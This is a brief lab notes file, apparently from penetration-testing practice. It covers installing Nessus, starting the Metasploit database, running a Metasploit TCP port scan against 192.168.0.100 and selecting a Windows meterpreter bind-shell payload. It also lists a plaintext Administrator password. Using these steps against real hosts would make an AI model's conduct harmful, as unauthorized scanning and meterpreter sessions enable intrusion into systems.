l6:
	Administrator 1234qqqQ
	https://tenable.com/downloads/nessus#download
	sudo dpkg -i Nessus-*.deb
postgres:
	service postgressql start
	sudo msfdb init
tcp:
	use auxiliary/scanner/portscan/tcp
	set RHOSTS 192.168.0.100
	set PORTS 20-5000
	use payload/windows/meterpreter/bind_tcp

